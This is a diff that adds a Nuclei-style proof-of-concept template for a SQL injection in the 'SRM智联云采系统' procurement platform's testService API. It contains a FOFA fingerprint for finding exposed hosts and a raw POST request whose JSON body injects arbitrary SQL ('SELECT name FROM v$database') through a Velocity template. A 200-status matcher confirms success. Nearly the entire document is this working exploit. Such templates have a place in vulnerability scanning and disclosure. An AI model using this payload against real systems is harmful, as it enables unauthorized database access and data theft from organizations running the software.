@@ -1,0 +1,39 @@
+id: poc-ec8vpqbw2znczsir
+info:
+  name: SRM智联云采系统 testservice sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ec8vpqbw2znczsir'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ec8vpqbw2znczsir
+    fofa: body="assets/js/jweixin"
+http:
+- raw:
+  - 'POST /adpweb/a/ica/api/testService HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Length: 368
+
+    Content-Type: application/json
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+
+    X-Requested-With: XMLHttpRequest
+
+    {"dbId": "1001", "dbSql": "#set ($lang = $lang) \n SELECT name FROM v$database", "responeTemplate": "{\n    \"std_data\": {\n        \"execution\": {\n            \"sqlcode\": \"$execution.sqlcode\",\n            \"description\": \"$execution.description\"\n        }\n}", "serviceCode": "test", "serviceName": "test", "serviceParams": "{\n    \"lang\": \"zh_CN\"\n}"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
